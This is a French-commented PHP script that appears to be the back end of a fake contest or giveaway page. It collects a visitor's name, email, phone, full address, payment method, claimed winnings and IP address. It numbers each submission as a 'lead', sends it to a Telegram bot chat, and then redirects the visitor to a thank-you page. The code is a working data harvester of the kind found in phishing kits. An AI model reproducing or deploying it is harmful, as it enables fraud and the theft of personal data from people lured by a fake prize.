<?php
// ===============================
//  Telegram Handler for Concours
// ===============================
// Remplacez ces deux valeurs par vos vraies informations Telegram
$botToken = '5529205468:AAEmNwJzZ0oQ4X_RVS0vhEL_GO4xpaytvwEVOTRE_BOT_TOKEN_ICI';
$chatId   = '5061239044'; // ID perso ou ID groupe/canal

// IP du visiteur
$ip = $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] . ' (proxy: ' . $ip . ')';
}

// Récupération sécurisée des champs du formulaire
$fullName  = $_POST['fullName']  ?? '';
$email     = $_POST['email']     ?? '';
$phone     = $_POST['phone']     ?? '';
$address   = $_POST['address']   ?? '';
$method    = $_POST['method']    ?? ''; // Récupéré via JS/Hidden field
$bonus     = $_POST['bonus']     ?? '';
$country   = $_POST['country']   ?? '';
$subdomain = $_POST['subdomain'] ?? '';
$city      = $_POST['city']      ?? ''; // Récupéré via JS/Hidden field
$postal    = $_POST['postal']    ?? ''; // Récupéré via JS/Hidden field

// Numérotation des formulaires envoyés
$leadNumberFile = __DIR__ . '/leads-counter.txt';
$leadNumber = 1;
if (file_exists($leadNumberFile)) {
    $leadNumber = (int)file_get_contents($leadNumberFile) + 1;
}
file_put_contents($leadNumberFile, (string)$leadNumber);

// Message envoyé sur Telegram
$message  = "📨 Nouveau formulaire (#{$leadNumber})\n\n";
$message .= "👤 Nom : {$fullName}\n";
$message .= "📧 Email : {$email}\n";
$message .= "📱 Téléphone : {$phone}\n";
$message .= "🏠 Adresse complète : {$address}\n";
$message .= "🏙️ Ville : {$city}\n";
$message .= "📮 Code postal : {$postal}\n";
$message .= "💳 Méthode de paiement : {$method}\n";
$message .= "💰 Montant gagné : €{$bonus}\n";
$message .= "🌍 Pays : {$country}\n";
$message .= "🧩 Subdomain : {$subdomain}\n";
$message .= "💻 IP : {$ip}\n";

$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$data = [
    'chat_id'    => $chatId,
    'text'       => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
        'timeout' => 10
    ]
];

$context  = stream_context_create($options);
$result   = @file_get_contents($telegramUrl, false, $context);

// Redirection vers une page de remerciement
header('Location: thankyou.html');
exit;
?>